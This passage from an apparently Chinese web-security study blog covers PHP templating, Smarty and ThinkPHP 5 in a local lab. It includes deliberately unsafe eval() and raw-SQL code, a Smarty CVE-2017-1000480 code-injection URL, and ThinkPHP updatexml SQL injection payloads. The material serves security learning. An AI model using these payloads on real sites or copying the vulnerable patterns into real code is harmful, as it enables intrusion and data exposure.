class="variable">$page_title</span>, <span class="variable">$template</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = str_replace(<span class="string">&#x27;&#123;heading&#125;&#x27;</span>, <span class="variable">$subheading</span>, <span class="variable">$template</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = str_replace(<span class="string">&#x27;&#123;subheading&#125;&#x27;</span>, <span class="variable">$subheading</span>, <span class="variable">$template</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = str_replace(<span class="string">&#x27;&#123;content&#125;&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$template</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = str_replace(<span class="string">&#x27;&#123;$item&#125;&#x27;</span>, <span class="variable">$item</span>, <span class="variable">$template</span>);</span></span><br><span class="line"></span><br><span class="line">// 将PHP代码嵌入HTML模板中并执行</span><br><span class="line">eval(&#x27;?&gt;&#x27; . $template);</span><br><span class="line"></span><br><span class="line">// 关闭数据库连接</span><br><span class="line"><span class="meta prompt_">mysqli_close($</span><span class="language-bash">con);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/37a7384f65231cb68f5398d88bd53956.png" alt="Untitled"></p>
<p><strong>安全问题</strong></p>
<p>如果在数据库中任何地方添加<code>&lt;?php phpinfo();?&gt;</code> ，在调用数据库内容的时候会自动显示</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0dd3c3c3fedf079aff95720af4baf734.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/70dc1dcc2df97e9f79a6f880b7dcb374.png" alt="Untitled"></p>
<p><strong><code>&lt;?php phpinfo(); ?&gt;</code></strong> 这段代码用于显示关于服务器 PHP 配置的详细信息。虽然 <strong><code>phpinfo()</code></strong> 是一个对开发人员有用的函数，可以获取有关 PHP 环境的信息，但在生产环境中应谨慎使用。</p>
<blockquote>
<p>​	安全风险： 显示详细的 PHP 信息可能透露有关服务器配置的敏感信息，包括 PHP 版本、扩展和路径。攻击者可以利用这些信息来识别潜在的漏洞。<br>​	信息泄露： 在生产环境中，显示详细的 PHP 信息是不推荐的，因为存在信息泄露的风险。攻击者可能利用这些信息更好地了解服务器的设置并识别潜在的攻击点。<br>​	服务器加固： 安全最佳实践涉及将服务器信息的暴露最小化，以减少攻击面。应该限制不必要的服务器环境信息，以降低攻击表面。</p>
</blockquote>
<h3 id="Smarty模版引用"><a href="#Smarty模版引用" class="headerlink" title="Smarty模版引用"></a>Smarty模版引用</h3><p>下载：<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/releases">https://github.com/smarty-php/smarty/releases</a></p>
<p>使用：<br>1、创建一个文件夹，命名为smarty<br>2、下载Smarty对应版本并解压缩到该文件夹中。<br>3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码：</p>
<p>配置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 引入 Smarty 类文件</span><br><span class="line">require(&#x27;smarty/libs/Smarty.class.php&#x27;);</span><br><span class="line"></span><br><span class="line">// 创建 Smarty 实例</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty = new Smarty;</span></span><br><span class="line"></span><br><span class="line">// 设置 Smarty 相关属性</span><br><span class="line">**$smarty-&gt;template_dir = &#x27;smarty/templates/&#x27;;  // 设置模板文件的目录**</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;compile_dir = <span class="string">&#x27;smarty/templates_c/&#x27;</span>;  // 设置编译文件的目录</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;cache_dir = <span class="string">&#x27;smarty/cache/&#x27;</span>;  // 设置缓存文件的目录</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;config_dir = <span class="string">&#x27;smarty/configs/&#x27;</span>;  // 设置配置文件的目录</span></span><br><span class="line"></span><br><span class="line">// 赋值变量到模板中</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;assign(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);  // 将变量 <span class="string">&#x27;title&#x27;</span> 赋值为 <span class="string">&#x27;欢迎使用 Smarty&#x27;</span></span></span><br><span class="line"></span><br><span class="line">// 显示模板</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;display(<span class="string">&#x27;index.tpl&#x27;</span>);  // 使用 <span class="string">&#x27;index.tpl&#x27;</span> 模板文件进行显示</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4、在smarty相关目录下创建<strong>smarty&#x2F;templates&#x2F; 并在目录下</strong>创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&#123;$title&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&#123;$title&#125;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c9d2bd6d8fcc7efb5eda1aa7fefebfe4.png" alt="Untitled"></p>
<p>安全性：在相关模板内容下加入<code>&lt;?php phpinfo();?&gt;</code> ，但是发现不能泄露</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/8650590a327e4f9af92af79a75a13b64.png" alt="Untitled"></p>
<h4 id="Smarty3模版引用-有对应漏洞"><a href="#Smarty3模版引用-有对应漏洞" class="headerlink" title="Smarty3模版引用-有对应漏洞"></a>Smarty3模版引用-有对应漏洞</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/magic-zero/p/8351974.html">Smarty &lt;&#x3D; 3.1.32 Remote Code execution(CVE-2017-1000480) - magic_zero - 博客园 (cnblogs.com)</a></p>
<p>使用：<br>1、创建一个文件夹，命名为smarty3<br>2、下载Smarty对应版本并解压缩到该文件夹中。<br>3、创建一个PHP文件，命名为index1.php，并在文件中添加以下代码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&#x27;SMARTY_ROOT_DIR&#x27;, str_replace(&#x27;\\&#x27;, &#x27;/&#x27;, __DIR__));</span><br><span class="line"></span><br><span class="line">**define(&#x27;SMARTY_COMPILE_DIR&#x27;, SMARTY_ROOT_DIR . &#x27;/smarty3/tmp/templates_c&#x27;);</span><br><span class="line"></span><br><span class="line">define(&#x27;SMARTY_CACHE_DIR&#x27;, SMARTY_ROOT_DIR . &#x27;/smarty3/tmp/cache&#x27;);</span><br><span class="line"></span><br><span class="line">include_once(SMARTY_ROOT_DIR . &#x27;/smarty3/libs/Smarty.class.php&#x27;);**</span><br><span class="line"></span><br><span class="line">class testSmarty extends Smarty_Resource_Custom</span><br><span class="line">&#123;</span><br><span class="line">    protected function fetch($name, &amp;$source, &amp;$mtime)</span><br><span class="line">    &#123;</span><br><span class="line">        $template = &quot;CVE-2017-1000480 smarty PHP code injection&quot;;</span><br><span class="line">        $source = $template;</span><br><span class="line">        $mtime = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty = new Smarty();</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;registerResource(<span class="string">&#x27;test&#x27;</span>, new testSmarty);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">smarty-&gt;display(<span class="string">&#x27;test:&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;eval&#x27;</span>]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将访问路由修改为<a target="_blank" rel="noopener" href="http://localhost:63342/dome01/index1.php?eval=*/phpinfo();//">http://localhost:63342/dome01/index1.php?*<em>eval&#x3D;</em>&#x2F;phpinfo();&#x2F;&#x2F;</a>，即可访问泄露</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/7da91250076835e1ab109472aefcadb9.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/8f210b01c250c0bdc786539bb0fd4885.png" alt="img"></p>
<h3 id="代码RCE安全测试"><a href="#代码RCE安全测试" class="headerlink" title="代码RCE安全测试"></a>代码RCE安全测试</h3><p>1、自写模版的安全隐患<br>2、第三方Smarty的安全隐患<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/list?flag=true">国家信息安全漏洞共享平台 (cnvd.org.cn)</a></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/a07a3a395d28e7f1c8c1bb01faa29711.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ffed80f462b44cbe2944d3816bf5d601.png" alt="Untitled"></p>
<h2 id="第六天"><a href="#第六天" class="headerlink" title="第六天"></a>第六天</h2><p>PHP应用&amp;TP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞</p>
<h3 id="TP框架-开发-配置架构-路由-MVC模型"><a href="#TP框架-开发-配置架构-路由-MVC模型" class="headerlink" title="TP框架-开发-配置架构&amp;路由&amp;MVC模型"></a>TP框架-开发-配置架构&amp;路由&amp;MVC模型</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1">https://www.kancloud.cn/manual/thinkphp5_1</a><br>1、配置架构-导入使用<br>修改小皮网址目录：G:\develop\safety\phpstudy_pro\WWW\dome01\thinkphp\public<br>192.168.137.1:84 访问成功</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/26565697f96c9def9f2240e101a793b8.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/86eb5ac40a3f6bcf7aa78107d59482d7.png" alt="Untitled"></p>
<p>2、路由访问-URL访问<br>访问方式需要按照，特定的访问方式才能访问到</p>
<blockquote>
<p>例如：需要访问初始页面；<a href="http://192.168.137.1:84**/index.php/Index/index/">http://192.168.137.1:84**/index.php/Index/index/</a>**<br>需要访问初始页面中新定义的函数：192.168.137.1:84**&#x2F;index.php&#x2F;Index&#x2F;index&#x2F;xi**</p>
</blockquote>
<p><img src="/img/xiaodi/52165f8cf71e7990a1f51efdac004423.png" alt="Untitled"></p>
<p>如果想返回域名或表单中输入的参数中的内容</p>
<ul>
<li><p>首先需要导入<strong>think\Controller类，Controller类是ThinkPHP框架提供的基础控制器类，你的Index类继承了这个控制器类。通过继承Controller</strong>，你可以使用框架提供的一些基础控制器功能，比如处理请求和响应。</p>
</li>
<li><p>其次完成代码回写</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">**use think\Controller;**</span><br><span class="line"></span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    // index方法用于处理首页请求</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        // 返回一个包含样式和内容的字符串</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/thinkad&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    **// xi方法用于处理名为xi的请求，返回请求参数中的&#x27;name&#x27;</span><br><span class="line">    public function xi()</span><br><span class="line">    &#123;</span><br><span class="line">        // 返回请求参数中的&#x27;name&#x27;</span><br><span class="line">        return $this-&gt;request-&gt;param(&#x27;name&#x27;);</span><br><span class="line">    &#125;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e8cabc350a2eaab4ed07bd59b43d61ff.png" alt="Untitled"></p>
<p>访问有两种方式：</p>
<p>192.168.137.1:84&#x2F;index.php&#x2F;Index&#x2F;index**&#x2F;xi&#x2F;name&#x2F;xiaosedi**<br>192.168.137.1:84&#x2F;index.php&#x2F;Index&#x2F;index**&#x2F;xi?name&#x3D;wusuowei**</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/09bbb2b68da553972730e61e40ed3ef6.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/8ff3ca5664226737cd67feb3dafc5a5a.png" alt="Untitled"></p>
<p>注意：</p>
<p>如果是使用php自带的请求方式访问则：只支持一种方式回写数据<br>192.168.137.1:84&#x2F;index.php&#x2F;Index&#x2F;index**&#x2F;xi?x&#x3D;123456**</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/22740b665884ad339ba3906282664423.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ca5c33fb2b06f0b610ee3fa5ed423c57.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9b4a9a9b9afc7707b0836a74ac7d32f1.png" alt="Untitled"></p>
<p>如果创建新的目录，例如application→text→controller→Test.php等</p>
<blockquote>
<p>修改namespace 中的路径<br>修改class 类名Test<br>192.168.137.1:84&#x2F;index.php**&#x2F;test&#x2F;Test&#x2F;xi?x&#x3D;wufa456**</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c84046dceb8e202bfe6a6d050147d2ea.png"></p>
<p>3、数据库操作-应用对象</p>
<ul>
<li>连接数据库找到数据库配置文件（database.php），并打开调试模式</li>
<li>引用数据的的类use think\Db;，使用数据库的查询语句</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use think\Db;</span><br><span class="line">public function testsql()</span><br><span class="line">    &#123;</span><br><span class="line">       //SELECT * FROM `think_user` WHERE  `id` = 1 LIMIT 1</span><br><span class="line">        // table方法必须指定完整的数据表名</span><br><span class="line">        $data = Db::table(&#x27;news&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;findOrFail();</span><br><span class="line">        return json($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d80528e3081f1bbdbfed05e68c70f6ae.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c01550d621af07cf84509ad903675633.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4343cea8af6f66591f9459d7301fcec3.png" alt="Untitled"></p>
<p>thinkphp的安全过滤：</p>
<p>如果是原生态php的话，数据库操作没有过滤就会受到SQL注入攻击</p>
<p>ThinkPHP框架提供了一些内置的数据库操作方法，使得对数据库的访问更加便捷和安全使用ThinkPHP框架操作数据库 默认是受到框架内置的过滤保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function testsql()</span><br><span class="line">    &#123;</span><br><span class="line">       //SELECT * FROM `think_user` WHERE  `id` = 1 LIMIT 1</span><br><span class="line">       //使用TP框架操作数据库 默认是受到框架内置的过滤保护</span><br><span class="line">        $id = request()-&gt;param(&#x27;x&#x27;);</span><br><span class="line">        $data = Db::table(&#x27;news&#x27;)-&gt;where(&#x27;id&#x27;, $id)-&gt;find();</span><br><span class="line">        return json($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/07c6ad8aa64003ecf332179905f647e5.png" alt="Untitled"></p>
<p>4、文件上传操作-应用对象</p>
<blockquote>
<p>在配置好的网址根目录public下创建upload.html</p>
<p>在upload.html中写入以下代码，并修改action的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/index.php/test/test/upload&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;!-- 表单提交的目标地址，这里是 /index.php/test/test/upload --&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;image&quot; /&gt; &lt;!-- 文件上传输入框，name 属性为 &quot;image&quot; --&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传&quot; /&gt; &lt;!-- 提交按钮，点击后触发表单提交 --&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在Test.php中输入以下代码（此代码对于上传文件，进行了诸多过滤，保证了安全性）</p>
</blockquote>
<p>​    </p>
<pre><code>public function upload()&#123;
    // 获取表单上传文件，例如上传了001.jpg
    $file = request()-&gt;file(&#39;image&#39;);
    
    // 移动到框架应用根目录/uploads/ 目录下
    $info = $file-&gt;validate([&#39;ext&#39;=&gt;&#39;jpg,png,gif&#39;])-&gt;move(&#39;../uploads&#39;);

    if($info)&#123;
        // 成功上传后，获取上传信息

        // 输出文件扩展名，例如 jpg
        echo $info-&gt;getExtension();
        echo &#39;&lt;br&gt;&#39;;

        // 输出文件保存路径，例如 20160820/42a79759f284b767dfcb2a0197904287.jpg
        echo $info-&gt;getSaveName();
        echo &#39;&lt;br&gt;&#39;;

        // 输出文件名，例如 42a79759f284b767dfcb2a0197904287.jpg
        echo $info-&gt;getFilename();
    &#125; else &#123;
        // 上传失败，获取错误信息
        echo $file-&gt;getError();
    &#125;
&#125;
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2367c2c528b1c5ca6c305f5ece0b3dfa.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/42ac00196188998684e7236ac0805f52.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/5553a64aced37986e95936dd7671b832.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/97035d08af2e131f3b81cb5570d72a9e.png" alt="Untitled"></p>
<p>5、前端页面渲染-MVC模型<br>在例如index（需要渲染的文件当前并行目录下）→view→index→index.html等<br><a target="_blank" rel="noopener" href="http://192.168.137.1:84/index.php/Index/index/index">http://192.168.137.1:84/index.php/Index/index/index</a> 输入对应的路由访问即可看到以及渲染的页面</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2836f2d0cfa5a57293c986f003dce433.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ed8a888b9cc9fac87bc46ad86834376e.png" alt="Untitled"></p>
<p>也可以指定内容可以指定模板</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        **//可以一一赋值</span><br><span class="line">       $this-&gt;assign(&#x27;name&#x27;,&#x27;ThinkPHP&#x27;);</span><br><span class="line">       $this-&gt;assign(&#x27;email&#x27;,&#x27;thinkphp@qq.com&#x27;);</span><br><span class="line">        //可以批量赋值</span><br><span class="line">       $this-&gt;assign([</span><br><span class="line">          &#x27;name&#x27; == &#x27;ThinkPHP&#x27;,</span><br><span class="line">          &#x27;email&#x27; == &#x27;thinkphp@qq.com&#x27;</span><br><span class="line">       ]);</span><br><span class="line">       //模板输出</span><br><span class="line">       return $this-&gt;fetch(&#x27;index/edit&#x27;);**</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5c370cb879a466f84fcc27543a8c9960.png" alt="Untitled"></p>
<h3 id="TP框架-安全-不安全写法-版本过滤绕过"><a href="#TP框架-安全-不安全写法-版本过滤绕过" class="headerlink" title="TP框架-安全-不安全写法&amp;版本过滤绕过"></a>TP框架-安全-不安全写法&amp;版本过滤绕过</h3><p>判断漏洞的方式：首先判断代码写法如果是不安全写法直接通过代码回写使用sql注入，如果是安全写法则判断中间框架版本号，依据版本号去寻找存在的漏洞</p>
<h4 id="1、内置代码写法"><a href="#1、内置代码写法" class="headerlink" title="1、内置代码写法"></a>1、内置代码写法</h4><p>例子：不合规的代码写法-TP5-自写</p>
<p>1、使用TP框架操作数据库 默认是受到框架内置过滤保护</p>
<p>2、原生态的数据库操作如果没有过滤就会受到SQL注入攻击</p>
<p>安全写法&#x3D;推荐写法 不安全写法&#x3D;原生写法（不会受到保护）</p>
<p>1、安全写法<br>规矩写法：不是绝对安全 看两点<br><strong>看版本的内置绕过漏洞 同样也有漏洞</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">id</span>=request()-&gt;param(<span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data=Db::table(<span class="string">&#x27;news&#x27;</span>)-&gt;<span class="built_in">where</span>(<span class="string">&#x27;id&#x27;</span>,<span class="variable">$id</span>)-&gt;find();</span></span><br></pre></td></tr></table></figure>


<p>2、用一半安全写法<br>用一半安全写法 有安全隐患</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//用一半安全写法 有安全隐患</span><br><span class="line"><span class="meta prompt_">   $</span><span class="language-bash"><span class="built_in">id</span>=request()-&gt;param(<span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_">   $</span><span class="language-bash">data=Db::query(<span class="string">&quot;select * from news where id=<span class="variable">$id</span>&quot;</span>);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3、纯原生写法(完全不是用TP语法)</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">// 构建SQL查询语句</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sql = <span class="string">&quot;select * from news where id=<span class="variable">$id</span>&quot;</span>;</span></span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">// 执行查询并获取结果集</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span></span><br><span class="line"></span><br><span class="line">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="line">while ($row = mysqli_fetch_row($data)) &#123;</span><br><span class="line">    // 从结果集中获取每一列的值，并存储到相应的变量中</span><br><span class="line">    $page_title = $row[1];</span><br><span class="line">    $heading = $row[2];</span><br><span class="line">    $subheading = $row[3];</span><br><span class="line">    $content = $row[4];</span><br><span class="line">    $item = $row[5];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>2、框架版本安全</strong><br>首先查看中间框架的版本是什么，如ThinkPHP的版本在thinkphp→thinkphp→tpl→base.php中查看</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2997621ae4f7f3478d5e0eb95215ac60.png" alt="Untitled"></p>
<p>依据版本号去查找，出现过的漏洞，进行复现即可（没有绝对的安全）</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9bd4cf8c8892b250e51c214406f53d4b.png" alt="Untitled"></p>
<p>例子1：写法内置安全绕过-TP5-SQL注入</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d459723fb9e87c109a597294b09953fe.png" alt="Untitled"></p>
<p><a target="_blank" rel="noopener" href="http://192.168.137.1:84/index.php/test/Test/testsql?username%5B0%5D=inc&username%5B1%5D=updatexml(1,concat(0x7,user(),0x7e&username%5B2%5D=1">http://192.168.137.1:84/index.php/test/Test/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e&amp;username[2]=1</a>** sql注入可以通过报错返回当前数据库表名</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/512c80e4aa2d44bcaa29f91a12f17fbe.png" alt="Untitled"></p>
<p><a target="_blank" rel="noopener" href="http://192.168.137.1:84/index.php/test/Test/testsql?username%5B0%5D=inc&username%5B1%5D=updatexml(1,concat(0x7,database(),0x7e&username%5B2%5D=1">http://192.168.137.1:84/index.php/test/Test/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,database(),0x7e&amp;username[2]=1</a>** sql注入可以通过报错返回当前数据库名称</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b48ae39d8d90db276c2eae0a66af1761.png" alt="Untitled"></p>
<p>例子2：内置版本安全漏洞-TP5-代码执行</p>
